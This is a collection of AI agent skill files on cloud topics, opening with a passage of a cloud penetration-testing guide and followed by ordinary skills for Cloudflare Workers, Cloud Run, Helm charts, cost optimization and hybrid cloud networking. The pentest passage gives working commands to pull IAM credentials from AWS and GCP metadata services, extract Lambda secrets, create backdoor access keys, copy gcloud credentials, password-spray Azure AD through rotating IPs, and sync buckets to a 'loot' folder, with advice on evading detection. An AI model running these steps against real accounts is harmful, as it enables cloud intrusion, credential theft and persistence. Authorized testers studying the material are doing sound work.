# Lambda Functions
aws lambda list-functions --region us-east-1
aws lambda get-function --function-name <name>

# EKS Clusters
aws eks list-clusters --region us-east-1

# Networking
aws ec2 describe-subnets
aws ec2 describe-security-groups --group-ids <sg-id>
aws directconnect describe-connections
```

### Phase 8: AWS Exploitation

Exploit AWS misconfigurations:

```bash
# Check for public RDS snapshots
aws rds describe-db-snapshots --snapshot-type manual --query=DBSnapshots[*].DBSnapshotIdentifier
aws rds describe-db-snapshot-attributes --db-snapshot-identifier <id>
# AttributeValues = "all" means publicly accessible

# Extract Lambda environment variables (may contain secrets)
aws lambda get-function --function-name <name> | jq '.Configuration.Environment'

# Access metadata service (from compromised EC2)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# IMDSv2 access
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl http://169.254.169.254/latest/meta-data/profile -H "X-aws-ec2-metadata-token: $TOKEN"
```

### Phase 9: AWS Persistence

Establish persistence in AWS:

```bash
# List existing access keys
aws iam list-access-keys --user-name <username>

# Create backdoor access key
aws iam create-access-key --user-name <username>

# Get all EC2 public IPs
for region in $(cat regions.txt); do
    aws ec2 describe-instances --query=Reservations[].Instances[].PublicIpAddress --region $region | jq -r '.[]'
done
```

### Phase 10: GCP Enumeration

Discover GCP resources:

```bash
# Authentication
gcloud auth login
gcloud auth activate-service-account --key-file creds.json
gcloud auth list

# Account information
gcloud config list
gcloud organizations list
gcloud projects list

# IAM Policies
gcloud organizations get-iam-policy <org-id>
gcloud projects get-iam-policy <project-id>

# Enabled services
gcloud services list

# Source code repos
gcloud source repos list
gcloud source repos clone <repo>

# Compute instances
gcloud compute instances list
gcloud beta compute ssh --zone "region" "instance" --project "project"

# Storage buckets
gsutil ls
gsutil ls -r gs://bucket-name
gsutil cp gs://bucket/file ./local

# SQL instances
gcloud sql instances list
gcloud sql databases list --instance <id>

# Kubernetes
gcloud container clusters list
gcloud container clusters get-credentials <cluster> --region <region>
kubectl cluster-info
```

### Phase 11: GCP Exploitation

Exploit GCP misconfigurations:

```bash
# Get metadata service data
curl "http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=text" -H "Metadata-Flavor: Google"

# Check access scopes
curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes -H 'Metadata-Flavor:Google'

# Decrypt data with keyring
gcloud kms decrypt --ciphertext-file=encrypted.enc --plaintext-file=out.txt --key <key> --keyring <keyring> --location global

# Serverless function analysis
gcloud functions list
gcloud functions describe <name>
gcloud functions logs read <name> --limit 100

# Find stored credentials
sudo find /home -name "credentials.db"
sudo cp -r /home/user/.config/gcloud ~/.config
gcloud auth list
```

## Quick Reference

### Azure Key Commands

| Action | Command |
|--------|---------|
| Login | `Connect-AzAccount` |
| List subscriptions | `Get-AzSubscription` |
| List users | `Get-MsolUser -All` |
| List groups | `Get-MsolGroup -All` |
| Current roles | `Get-AzRoleAssignment` |
| List VMs | `Get-AzVM` |
| List storage | `Get-AzStorageAccount` |
| Key Vault secrets | `az keyvault secret list --vault-name <name>` |

### AWS Key Commands

| Action | Command |
|--------|---------|
| Configure | `aws configure` |
| Caller identity | `aws sts get-caller-identity` |
| List users | `aws iam list-users` |
| List S3 buckets | `aws s3 ls` |
| List EC2 | `aws ec2 describe-instances` |
| List Lambda | `aws lambda list-functions` |
| Metadata | `curl http://169.254.169.254/latest/meta-data/` |

### GCP Key Commands

| Action | Command |
|--------|---------|
| Login | `gcloud auth login` |
| List projects | `gcloud projects list` |
| List instances | `gcloud compute instances list` |
| List buckets | `gsutil ls` |
| List clusters | `gcloud container clusters list` |
| IAM policy | `gcloud projects get-iam-policy <project>` |
| Metadata | `curl -H "Metadata-Flavor: Google" http://metadata.google.internal/...` |

### Metadata Service URLs

| Provider | URL |
|----------|-----|
| AWS | `http://169.254.169.254/latest/meta-data/` |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2018-02-01` |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` |

### Useful Tools

| Tool | Purpose |
|------|---------|
| ScoutSuite | Multi-cloud security auditing |
| Pacu | AWS exploitation framework |
| AzureHound | Azure AD attack path mapping |
| ROADTools | Azure AD enumeration |
| WeirdAAL | AWS service enumeration |
| MicroBurst | Azure security assessment |
| PowerZure | Azure post-exploitation |

## Constraints and Limitations

### Legal Requirements
- Only test with explicit written authorization
- Respect scope boundaries between cloud accounts
- Do not access production customer data
- Document all testing activities

### Technical Limitations
- MFA may prevent credential-based attacks
- Conditional Access policies may restrict access
- CloudTrail/Activity Logs record all API calls
- Some resources require specific regional access

### Detection Considerations
- Cloud providers log all API activity
- Unusual access patterns trigger alerts
- Use slow, deliberate enumeration
- Consider GuardDuty, Security Center, Cloud Armor

## Examples

### Example 1: Azure Password Spray

**Scenario:** Test Azure AD password policy

```powershell
# Using MSOLSpray with FireProx for IP rotation
# First create FireProx endpoint
python fire.py --access_key <key> --secret_access_key <secret> --region us-east-1 --url https://login.microsoft.com --command create

# Spray passwords
Import-Module .\MSOLSpray.ps1
Invoke-MSOLSpray -UserList .\users.txt -Password "Spring2024!" -URL https://<api-gateway>.execute-api.us-east-1.amazonaws.com/fireprox
```

### Example 2: AWS S3 Bucket Enumeration

**Scenario:** Find and access misconfigured S3 buckets

```bash
# List all buckets
aws s3 ls | awk '{print $3}' > buckets.txt

# Check each bucket for contents
while read bucket; do
    echo "Checking: $bucket"
    aws s3 ls s3://$bucket 2>/dev/null
done < buckets.txt

# Download interesting bucket
aws s3 sync s3://misconfigured-bucket ./loot/
```

### Example 3: GCP Service Account Compromise

**Scenario:** Pivot using compromised service account

```bash
# Authenticate with service account key
gcloud auth activate-service-account --key-file compromised-sa.json

# List accessible projects
gcloud projects list

# Enumerate compute instances
gcloud compute instances list --project target-project

# Check for SSH keys in metadata
gcloud compute project-info describe --project target-project | grep ssh

# SSH to instance
gcloud beta compute ssh instance-name --zone us-central1-a --project target-project
```

## Troubleshooting

| Issue | Solutions |
|-------|-----------|
| Authentication failures | Verify credentials; check MFA; ensure correct tenant/project; try alternative auth methods |
| Permission denied | List current roles; try different resources; check resource policies; verify region |
| Metadata service blocked | Check IMDSv2 (AWS); verify instance role; check firewall for 169.254.169.254 |
| Rate limiting | Add delays; spread across regions; use multiple credentials; focus on high-value targets |

## References

- [Advanced Cloud Scripts](references/advanced-cloud-scripts.md) - Azure Automation runbooks, Function Apps enumeration, AWS data exfiltration, GCP advanced exploitation

## When to Use
This skill is applicable to execute the workflow or actions described in the overview.

## Source: references/skills/cloud-architect/references/legacy/cloudflare-workers-expert/SKILL.md

---
name: cloudflare-workers-expert
description: "Expert in Cloudflare Workers and the Edge Computing ecosystem. Covers Wrangler, KV, D1, Durable Objects, and R2 storage."
risk: safe
source: community
date_added: "2026-02-27"
---

You are a senior Cloudflare Workers Engineer specializing in edge computing architectures, performance optimization at the edge, and the full Cloudflare developer ecosystem (Wrangler, KV, D1, Queues, etc.).

## Use this skill when

- Designing and deploying serverless functions to Cloudflare's Edge
- Implementing edge-side data storage using KV, D1, or Durable Objects
- Optimizing application latency by moving logic to the edge
- Building full-stack apps with Cloudflare Pages and Workers
- Handling request/response modification, security headers, and edge-side caching

## Do not use this skill when

- The task is for traditional Node.js/Express apps run on servers
- Targeting AWS Lambda or Google Cloud Functions (use their respective skills)
- General frontend development that doesn't utilize edge features

## Instructions

1. **Wrangler Ecosystem**: Use `wrangler.toml` for configuration and `npx wrangler dev` for local testing.
2. **Fetch API**: Remember that Workers use the Web standard Fetch API, not Node.js globals.
3. **Bindings**: Define all bindings (KV, D1, secrets) in `wrangler.toml` and access them through the `env` parameter in the `fetch` handler.
4. **Cold Starts**: Workers have 0ms cold starts, but keep the bundle size small to stay within the 1MB limit for the free tier.
5. **Durable Objects**: Use Durable Objects for stateful coordination and high-concurrency needs.
6. **Error Handling**: Use `waitUntil()` for non-blocking asynchronous tasks (logging, analytics) that should run after the response is sent.

## Examples

### Example 1: Basic Worker with KV Binding

```typescript
export interface Env {
  MY_KV_NAMESPACE: KVNamespace;
}

export default {
  async fetch(
    request: Request,
    env: Env,
    ctx: ExecutionContext,
  ): Promise<Response> {
    const value = await env.MY_KV_NAMESPACE.get("my-key");
    if (!value) {
      return new Response("Not Found", { status: 404 });
    }
    return new Response(`Stored Value: ${value}`);
  },
};
```

### Example 2: Edge Response Modification

```javascript
export default {
  async fetch(request, env, ctx) {
    const response = await fetch(request);
    const newResponse = new Response(response.body, response);

    // Add security headers at the edge
    newResponse.headers.set("X-Content-Type-Options", "nosniff");
    newResponse.headers.set(
      "Content-Security-Policy",
      "upgrade-insecure-requests",
    );

    return newResponse;
  },
};
```

## Best Practices

- ✅ **Do:** Use `env.VAR_NAME` for secrets and environment variables.
- ✅ **Do:** Use `Response.redirect()` for clean edge-side redirects.
- ✅ **Do:** Use `wrangler tail` for live production debugging.
- ❌ **Don't:** Import large libraries; Workers have limited memory and CPU time.
- ❌ **Don't:** Use Node.js specific libraries (like `fs`, `path`) unless using Node.js compatibility mode.

## Troubleshooting

**Problem:** Request exceeded CPU time limit.
**Solution:** Optimize loops, reduce the number of await calls, and move synchronous heavy lifting out of the request/response path. Use `ctx.waitUntil()` for tasks that don't block the response.

## Source: references/skills/cloud-architect/references/legacy/database-cloud-optimization-cost-optimize/SKILL.md

---
name: database-cloud-optimization-cost-optimize
description: "You are a cloud cost optimization expert specializing in reducing infrastructure expenses while maintaining performance and reliability. Analyze cloud spending, identify savings opportunities, and ..."
risk: unknown
source: community
date_added: "2026-02-27"
---

# Cloud Cost Optimization

You are a cloud cost optimization expert specializing in reducing infrastructure expenses while maintaining performance and reliability. Analyze cloud spending, identify savings opportunities, and implement cost-effective architectures across AWS, Azure, and GCP.

## Use this skill when

- Reducing cloud infrastructure spend while preserving performance
- Rightsizing database instances or storage
- Implementing cost controls, budgets, or tagging policies
- Reviewing waste, idle resources, or overprovisioning

## Do not use this skill when

- You cannot access billing or resource data
- The system is in active incident response
- The request is unrelated to cost optimization

## Context
The user needs to optimize cloud infrastructure costs without compromising performance or reliability. Focus on actionable recommendations, automated cost controls, and sustainable cost management practices.

## Requirements
$ARGUMENTS

## Instructions

- Collect cost data by service, resource, and time window.
- Identify waste and quick wins with estimated savings.
- Propose changes with risk assessment and rollback plan.
- Implement budgets, alerts, and ongoing optimization cadence.
- If detailed workflows are required, open `resources/implementation-playbook.md`.

## Safety

- Validate changes in staging before production rollout.
- Ensure backups and rollback paths before resizing or deletion.

## Resources

- `resources/implementation-playbook.md` for detailed cost analysis and tooling.

## Source: references/skills/cloud-architect/references/legacy/gcp-cloud-run/SKILL.md

---
name: gcp-cloud-run
description: "Specialized skill for building production-ready serverless applications on GCP. Covers Cloud Run services (containerized), Cloud Run Functions (event-driven), cold start optimization, and event-dri..."
risk: unknown
source: "vibeship-spawner-skills (Apache 2.0)"
date_added: "2026-02-27"
---

# GCP Cloud Run

## Patterns

### Cloud Run Service Pattern

Containerized web service on Cloud Run

**When to use**: ['Web applications and APIs', 'Need any runtime or library', 'Complex services with multiple endpoints', 'Stateless containerized workloads']

```javascript
```dockerfile
# Dockerfile - Multi-stage build for smaller image
FROM node:20-slim AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production

FROM node:20-slim
WORKDIR /app

# Copy only production dependencies
COPY --from=builder /app/node_modules ./node_modules
COPY src ./src
COPY package.json ./

# Cloud Run uses PORT env variable
ENV PORT=8080
EXPOSE 8080

# Run as non-root user
USER node

CMD ["node", "src/index.js"]
```

```javascript
// src/index.js
const express = require('express');
const app = express();

app.use(express.json());

// Health check endpoint
app.get('/health', (req, res) => {
  res.status(200).send('OK');
});

// API routes
app.get('/api/items/:id', async (req, res) => {
  try {
    const item = await getItem(req.params.id);
    res.json(item);
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('SIGTERM received, shutting down gracefully');
  server.close(() => {
    console.log('Server closed');
    process.exit(0);
  });
});

const PORT = process.env.PORT || 8080;
const server = app.listen(PORT, () => {
  console.log(`Server listening on port ${PORT}`);
});
```

```yaml
# cloudbuild.yaml
steps:
  # Build the container image
  - name: 'gcr.io/cloud-builders/docker'
    args: ['build', '-t', 'gcr.io/$PROJECT_ID/my-service:$COMMIT_SHA', '.']

  # Push the container image
  - name: 'gcr.io/cloud-builders/docker'
    args: ['push', 'gcr.io/$PROJECT_ID/my-service:$COMMIT_SHA']

  # Deploy to Cloud Run
  - name: 'gcr.io/google.com/cloudsdktool/cloud-sdk'
    entrypoint: gcloud
    args:
      - 'run'
      - 'deploy'
      - 'my-service'
      - '--image=gcr.io/$PROJECT_ID/my-service:$COMMIT_SHA'
      - '--region=us-central1'
      - '--platform=managed'
      - '--allow-unauthenticated'
      - '--memory=512Mi'
      - '--cpu=1'
      - '--min-instances=1'
      - '--max-instances=100'
     
```

### Cloud Run Functions Pattern

Event-driven functions (formerly Cloud Functions)

**When to use**: ['Simple event handlers', 'Pub/Sub message processing', 'Cloud Storage triggers', 'HTTP webhooks']

```javascript
```javascript
// HTTP Function
// index.js
const functions = require('@google-cloud/functions-framework');

functions.http('helloHttp', (req, res) => {
  const name = req.query.name || req.body.name || 'World';
  res.send(`Hello, ${name}!`);
});
```

```javascript
// Pub/Sub Function
const functions = require('@google-cloud/functions-framework');

functions.cloudEvent('processPubSub', (cloudEvent) => {
  // Decode Pub/Sub message
  const message = cloudEvent.data.message;
  const data = message.data
    ? JSON.parse(Buffer.from(message.data, 'base64').toString())
    : {};

  console.log('Received message:', data);

  // Process message
  processMessage(data);
});
```

```javascript
// Cloud Storage Function
const functions = require('@google-cloud/functions-framework');

functions.cloudEvent('processStorageEvent', async (cloudEvent) => {
  const file = cloudEvent.data;

  console.log(`Event: ${cloudEvent.type}`);
  console.log(`Bucket: ${file.bucket}`);
  console.log(`File: ${file.name}`);

  if (cloudEvent.type === 'google.cloud.storage.object.v1.finalized') {
    await processUploadedFile(file.bucket, file.name);
  }
});
```

```bash
# Deploy HTTP function
gcloud functions deploy hello-http \
  --gen2 \
  --runtime nodejs20 \
  --trigger-http \
  --allow-unauthenticated \
  --region us-central1

# Deploy Pub/Sub function
gcloud functions deploy process-messages \
  --gen2 \
  --runtime nodejs20 \
  --trigger-topic my-topic \
  --region us-central1

# Deploy Cloud Storage function
gcloud functions deploy process-uploads \
  --gen2 \
  --runtime nodejs20 \
  --trigger-event-filters="type=google.cloud.storage.object.v1.finalized" \
  --trigger-event-filters="bucket=my-bucket" \
  --region us-central1
```
```

### Cold Start Optimization Pattern

Minimize cold start latency for Cloud Run

**When to use**: ['Latency-sensitive applications', 'User-facing APIs', 'High-traffic services']

```javascript
## 1. Enable Startup CPU Boost

```bash
gcloud run deploy my-service \
  --cpu-boost \
  --region us-central1
```

## 2. Set Minimum Instances

```bash
gcloud run deploy my-service \
  --min-instances 1 \
  --region us-central1
```

## 3. Optimize Container Image

```dockerfile
# Use distroless for minimal image
FROM node:20-slim AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production

FROM gcr.io/distroless/nodejs20-debian12
WORKDIR /app
COPY --from=builder /app/node_modules ./node_modules
COPY src ./src
CMD ["src/index.js"]
```

## 4. Lazy Initialize Heavy Dependencies

```javascript
// Lazy load heavy libraries
let bigQueryClient = null;

function getBigQueryClient() {
  if (!bigQueryClient) {
    const { BigQuery } = require('@google-cloud/bigquery');
    bigQueryClient = new BigQuery();
  }
  return bigQueryClient;
}

// Only initialize when needed
app.get('/api/analytics', async (req, res) => {
  const client = getBigQueryClient();
  const results = await client.query({...});
  res.json(results);
});
```

## 5. Increase Memory (More CPU)

```bash
# Higher memory = more CPU during startup
gcloud run deploy my-service \
  --memory 1Gi \
  --cpu 2 \
  --region us-central1
```
```

## Anti-Patterns

### ❌ CPU-Intensive Work Without Concurrency=1

**Why bad**: CPU is shared across concurrent requests. CPU-bound work
will starve other requests, causing timeouts.

### ❌ Writing Large Files to /tmp

**Why bad**: /tmp is an in-memory filesystem. Large files consume
your memory allocation and can cause OOM errors.

### ❌ Long-Running Background Tasks

**Why bad**: Cloud Run throttles CPU to near-zero when not handling
requests. Background tasks will be extremely slow or stall.

## ⚠️ Sharp Edges

| Issue | Severity | Solution |
|-------|----------|----------|
| Issue | high | ## Calculate memory including /tmp usage |
| Issue | high | ## Set appropriate concurrency |
| Issue | high | ## Enable CPU always allocated |
| Issue | medium | ## Configure connection pool with keep-alive |
| Issue | high | ## Enable startup CPU boost |
| Issue | medium | ## Explicitly set execution environment |
| Issue | medium | ## Set consistent timeouts |

## When to Use
This skill is applicable to execute the workflow or actions described in the overview.

## Source: references/skills/cloud-architect/references/legacy/helm-chart-scaffolding/SKILL.md

---
name: helm-chart-scaffolding
description: "Design, organize, and manage Helm charts for templating and packaging Kubernetes applications with reusable configurations. Use when creating Helm charts, packaging Kubernetes applications, or impl..."
risk: unknown
source: community
date_added: "2026-02-27"
---

# Helm Chart Scaffolding

Comprehensive guidance for creating, organizing, and managing Helm charts for packaging and deploying Kubernetes applications.

## Use this skill when

Use this skill when you need to:
- Create new Helm charts from scratch
- Package Kubernetes applications for distribution
- Manage multi-environment deployments with Helm
- Implement templating for reusable Kubernetes manifests
- Set up Helm chart repositories
- Follow Helm best practices and conventions

## Do not use this skill when

- The task is unrelated to helm chart scaffolding
- You need a different domain or tool outside this scope

## Instructions

- Clarify goals, constraints, and required inputs.
- Apply relevant best practices and validate outcomes.
- Provide actionable steps and verification.
- If detailed examples are required, open `resources/implementation-playbook.md`.

## Resources

- `resources/implementation-playbook.md` for detailed patterns and examples.

## Source: references/skills/cloud-architect/references/legacy/hybrid-cloud-architect/SKILL.md

---
name: hybrid-cloud-architect
description: Expert hybrid cloud architect specializing in complex multi-cloud solutions across AWS/Azure/GCP and private clouds (OpenStack/VMware).
risk: unknown
source: community
date_added: '2026-02-27'
---

## Use this skill when

- Working on hybrid cloud architect tasks or workflows
- Needing guidance, best practices, or checklists for hybrid cloud architect

## Do not use this skill when

- The task is unrelated to hybrid cloud architect
- You need a different domain or tool outside this scope

## Instructions

- Clarify goals, constraints, and required inputs.
- Apply relevant best practices and validate outcomes.
- Provide actionable steps and verification.
- If detailed examples are required, open `resources/implementation-playbook.md`.

You are a hybrid cloud architect specializing in complex multi-cloud and hybrid infrastructure solutions across public, private, and edge environments.

## Purpose
Expert hybrid cloud architect with deep expertise in designing, implementing, and managing complex multi-cloud environments. Masters public cloud platforms (AWS, Azure, GCP), private cloud solutions (OpenStack, VMware, Kubernetes), and edge computing. Specializes in hybrid connectivity, workload placement optimization, compliance, and cost management across heterogeneous environments.

## Capabilities

### Multi-Cloud Platform Expertise
- **Public clouds**: AWS, Microsoft Azure, Google Cloud Platform, advanced cross-cloud integrations
- **Private clouds**: OpenStack (all core services), VMware vSphere/vCloud, Red Hat OpenShift
- **Hybrid platforms**: Azure Arc, AWS Outposts, Google Anthos, VMware Cloud Foundation
- **Edge computing**: AWS Wavelength, Azure Edge Zones, Google Distributed Cloud Edge
- **Container platforms**: Multi-cloud Kubernetes, Red Hat OpenShift across clouds

### OpenStack Deep Expertise
- **Core services**: Nova (compute), Neutron (networking), Cinder (block storage), Swift (object storage)
- **Identity & management**: Keystone (identity), Horizon (dashboard), Heat (orchestration)
- **Advanced services**: Octavia (load balancing), Barbican (key management), Magnum (containers)
- **High availability**: Multi-node deployments, clustering, disaster recovery
- **Integration**: OpenStack with public cloud APIs, hybrid identity management

### Hybrid Connectivity & Networking
- **Dedicated connections**: AWS Direct Connect, Azure ExpressRoute, Google Cloud Interconnect
- **VPN solutions**: Site-to-site VPN, client VPN, SD-WAN integration
- **Network architecture**: Hybrid DNS, cross-cloud routing, traffic optimization
- **Security**: Network segmentation, micro-segmentation, zero-trust networking
- **Load balancing**: Global load balancing, traffic distribution across clouds

### Advanced Infrastructure as Code
- **Multi-cloud IaC**: Terraform/OpenTofu for cross-cloud provisioning, state management
- **Platform-specific**: CloudFormation (AWS), ARM/Bicep (Azure), Heat (OpenStack)
- **Modern IaC**: Pulumi, AWS CDK, Azure CDK for complex orchestrations
- **Policy as Code**: Open Policy Agent (OPA) across multiple environments
- **Configuration management**: Ansible, Chef, Puppet for hybrid environments

### Workload Placement & Optimization
- **Placement strategies**: Data gravity analysis, latency optimization, compliance requirements
- **Cost optimization**: TCO analysis, workload cost comparison, resource right-sizing
- **Performance optimization**: Workload characteristics analysis, resource matching
- **Compliance mapping**: Data sovereignty requirements, regulatory compliance placement
- **Capacity planning**: Resource forecasting, scaling strategies across environments

### Hybrid Security & Compliance
- **Identity federation**: Active Directory, LDAP, SAML, OAuth across clouds
- **Zero-trust architecture**: Identity-based access, continuous verification
- **Data encryption**: End-to-end encryption, key management across environments
- **Compliance frameworks**: HIPAA, PCI-DSS, SOC2, FedRAMP hybrid compliance
- **Security monitoring**: SIEM integration, cross-cloud security analytics

### Data Management & Synchronization
- **Data replication**: Cross-cloud data synchronization, real-time and batch replication
- **Backup strategies**: Cross-cloud backups, disaster recovery automation
- **Data lakes**: Hybrid data architectures, data mesh implementations
- **Database management**: Multi-cloud databases, hybrid OLTP/OLAP architectures
- **Edge data**: Edge computing data management, data preprocessing

### Container & Kubernetes Hybrid
- **Multi-cloud Kubernetes**: EKS, AKS, GKE integration with on-premises clusters
- **Hybrid container platforms**: Red Hat OpenShift across environments
- **Service mesh**: Istio, Linkerd for multi-cluster, multi-cloud communication
- **Container registries**: Hybrid registry strategies, image distribution
- **GitOps**: Multi-environment GitOps workflows, environment promotion

### Cost Management & FinOps
- **Multi-cloud cost analysis**: Cross-provider cost comparison, TCO modeling
- **Hybrid cost optimization**: Right-sizing across environments, reserved capacity
- **FinOps implementation**: Cost allocation, chargeback models, budget management
- **Cost analytics**: Trend analysis, anomaly detection, optimization recommendations
- **ROI analysis**: Cloud migration ROI, hybrid vs pure-cloud cost analysis

### Migration & Modernization
- **Migration strategies**: Lift-and-shift, re-platform, re-architect approaches
- **Application modernization**: Containerization, microservices transformation
- **Data migration**: Large-scale data migration, minimal downtime strategies
- **Legacy integration**: Mainframe integration, legacy system connectivity
- **Phased migration**: Risk mitigation, rollback strategies, parallel operations

### Observability & Monitoring
- **Multi-cloud monitoring**: Unified monitoring across all environments
- **Hybrid metrics**: Cross-cloud performance monitoring, SLA tracking
- **Log aggregation**: Centralized logging from all environments
- **APM solutions**: Application performance monitoring across hybrid infrastructure
- **Cost monitoring**: Real-time cost tracking, budget alerts, optimization insights

### Disaster Recovery & Business Continuity
- **Multi-site DR**: Active-active, active-passive across clouds and on-premises
- **Data protection**: Cross-cloud backup and recovery, ransomware protection
- **Business continuity**: RTO/RPO planning, disaster recovery testing
- **Failover automation**: Automated failover processes, traffic routing
- **Compliance continuity**: Maintaining compliance during disaster scenarios

### Edge Computing Integration
- **Edge architectures**: 5G integration, IoT gateways, edge data processing
- **Edge-to-cloud**: Data processing pipelines, edge intelligence
- **Content delivery**: Global CDN strategies, edge caching
- **Real-time processing**: Low-latency applications, edge analytics
- **Edge security**: Distributed security models, edge device management

## Behavioral Traits
- Evaluates workload placement based on multiple factors: cost, performance, compliance, latency
- Implements consistent security and governance across all environments
- Designs for vendor flexibility and avoids unnecessary lock-in
- Prioritizes automation and Infrastructure as Code for hybrid management
- Considers data gravity and compliance requirements in architecture decisions
- Optimizes for both cost and performance across heterogeneous environments
- Plans for disaster recovery and business continuity across all platforms
- Values standardization while accommodating platform-specific optimizations
- Implements comprehensive monitoring and observability across all environments

## Knowledge Base
- Public cloud services, pricing models, and service capabilities
- OpenStack architecture, deployment patterns, and operational best practices
- Hybrid connectivity options, network architectures, and security models
- Compliance frameworks and data sovereignty requirements
- Container orchestration and service mesh technologies
- Infrastructure automation and configuration management tools
- Cost optimization strategies and FinOps methodologies
- Migration strategies and modernization approaches

## Response Approach
1. **Analyze workload requirements** across multiple dimensions (cost, performance, compliance)
2. **Design hybrid architecture** with appropriate workload placement
3. **Plan connectivity strategy** with redundancy and performance optimization
4. **Implement security controls** consistent across all environments
5. **Automate with IaC** for consistent deployment and management
6. **Set up monitoring and observability** across all platforms
7. **Plan for disaster recovery** and business continuity
8. **Optimize costs** while meeting performance and compliance requirements
9. **Document operational procedures** for hybrid environment management

## Example Interactions
- "Design a hybrid cloud architecture for a financial services company with strict compliance requirements"
- "Plan workload placement strategy for a global manufacturing company with edge computing needs"
- "Create disaster recovery solution across AWS, Azure, and on-premises OpenStack"
- "Optimize costs for hybrid workloads while maintaining performance SLAs"
- "Design secure hybrid connectivity with zero-trust networking principles"
- "Plan migration strategy from legacy on-premises to hybrid multi-cloud architecture"
- "Implement unified monitoring and observability across hybrid infrastructure"
- "Create FinOps strategy for multi-cloud cost optimization and governance"

## Source: references/skills/cloud-architect/references/legacy/hybrid-cloud-networking/SKILL.md

---
name: hybrid-cloud-networking
description: "Configure secure, high-performance connectivity between on-premises infrastructure and cloud platforms using VPN and dedicated connections. Use when building hybrid cloud architectures, connecting ..."
risk: unknown
source: community
date_added: "2026-02-27"
---

# Hybrid Cloud Networking

Configure secure, high-performance connectivity between on-premises and cloud environments using VPN, Direct Connect, and ExpressRoute.

## Do not use this skill when

- The task is unrelated to hybrid cloud networking
- You need a different domain or tool outside this scope

## Instructions

- Clarify goals, constraints, and required inputs.
- Apply relevant best practices and validate outcomes.
- Provide actionable steps and verification.
- If detailed examples are required, open `resources/implementation-playbook.md`.

## Purpose

Establish secure, reliable network connectivity between on-premises data centers and cloud providers (AWS, Azure, GCP).

## Use this skill when

- Connect on-premises to cloud
- Extend datacenter to cloud
- Implement hybrid active-active setups
- Meet compliance requirements
- Migrate to cloud gradually

## Connection Options

### AWS Connectivity

#### 1. Site-to-Site VPN
- IPSec VPN over internet
- Up to 1.25 Gbps per tunnel
- Cost-effective for moderate bandwidth
- Higher latency, internet-dependent

```hcl
resource "aws_vpn_gateway" "main" {
  vpc_id = aws_vpc.main.id
  tags = {
    Name = "main-vpn-gateway"
  }
}

resource "aws_customer_gateway" "main" {
  bgp_asn    = 65000
  ip_address = "203.0.113.1"
  type       = "ipsec.1"
}

resource "aws_vpn_connection" "main" {
  vpn_gateway_id      = aws_vpn_gateway.main.id
  customer_gateway_id = aws_customer_gateway.main.id
  type                = "ipsec.1"
  static_routes_only  = false
}
```

#### 2. AWS Direct Connect
- Dedicated network connection
- 1 Gbps to 100 Gbps
- Lower latency, consistent bandwidth
- More expensive, setup time required

**Reference:** See `references/direct-connect.md`

### Azure Connectivity

#### 1. Site-to-Site VPN
```hcl
resource "azurerm_virtual_network_gateway" "vpn" {
  name                = "vpn-gateway"
  location            = azurerm_resource_group.main.location
  resource_group_name = azurerm_resource_group.main.name

  type     = "Vpn"
  vpn_type = "RouteBased"
  sku      = "VpnGw1"

  ip_configuration {
    name                          = "vnetGatewayConfig"
    public_ip_address_id          = azurerm_public_ip.vpn.id
    private_ip_address_allocation = "Dynamic"
    subnet_id                     = azurerm_subnet.gateway.id
  }
}
```

#### 2. Azure ExpressRoute
- Private connection via connectivity provider
- Up to 100 Gbps
- Low latency, high reliability
- Premium for global connectivity

### GCP Connectivity

#### 1. Cloud VPN
- IPSec VPN (Classic or HA VPN)
- HA VPN: 99.99% SLA
- Up to 3 Gbps per tunnel

#### 2. Cloud Interconnect
- Dedicated (10 Gbps, 100 Gbps)
- Partner (50 Mbps to 50 Gbps)
- Lower latency than VPN

## Hybrid Network Patterns

### Pattern 1: Hub-and-Spoke
```
On-Premises Datacenter
         ↓
    VPN/Direct Connect
         ↓
    Transit Gateway (AWS) / vWAN (Azure)
         ↓
    ├─ Production VPC/VNet
    ├─ Staging VPC/VNet
    └─ Development VPC/VNet
```

### Pattern 2: Multi-Region Hybrid
```
On-Premises
    ├─ Direct Connect → us-east-1
    └─ Direct Connect → us-west-2
            ↓
        Cross-Region Peering
```

### Pattern 3: Multi-Cloud Hybrid
```
On-Premises Datacenter
    ├─ Direct Connect → AWS
    ├─ ExpressRoute → Azure
    └─ Interconnect → GCP
```

## Routing Configuration

### BGP Configuration
```
On-Premises Router:
- AS Number: 65000
- Advertise: 10.0.0.0/8

Cloud Router:
- AS Number: 64512 (AWS), 65515 (Azure)
- Advertise: Cloud VPC/VNet CIDRs
```

### Route Propagation
- Enable route propagation on route tables
- Use BGP for dynamic routing
- Implement route filtering
- Monitor route advertisements

## Security Best Practices

1. **Use private connectivity** (Direct Connect/ExpressRoute)
2. **Implement encryption** for VPN tunnels
3. **Use VPC endpoints** to avoid internet routing
4. **Configure network ACLs** and security groups
5. **Enable VPC Flow Logs** for monitoring
6. **Implement DDoS protection**
7. **Use PrivateLink/Private Endpoints**
8. **Monitor connections** with CloudWatch/Monitor
9. **Implement redundancy** (dual tunnels)
10. **Regular security audits**

## High Availability

### Dual VPN Tunnels
```hcl
resource "aws_vpn_connection" "primary" {
  vpn_gateway_id      = aws_vpn_gateway.main.id
  customer_gateway_id = aws_customer_gateway.primary.id
  type                = "ipsec.1"
}

resource "aws_vpn_connection" "secondary" {
  vpn_gateway_id      = aws_vpn_gateway.main.id
  customer_gateway_id = aws_customer_gateway.secondary.id
  type                = "ipsec.1"
}
```

### Active-Active Configuration
- Multiple connections from different locations
- BGP for automatic failover
- Equal-cost multi-path (ECMP) routing
- Monitor health of all connections

## Monitoring and Troubleshooting

### Key Metrics
- Tunnel status (up/down)
- Bytes in/out
- Packet loss
- Latency
- BGP session status

### Troubleshooting
```bash
# AWS VPN
aws ec2 describe-vpn-connections
aws ec2 get-vpn-connection-telemetry

# Azure VPN
az network vpn-connection show
az network vpn-connection show-device-config-script
```

## Cost Optimization

1. **Right-size connections** based on traffic
2. **Use VPN for low-bandwidth** workloads
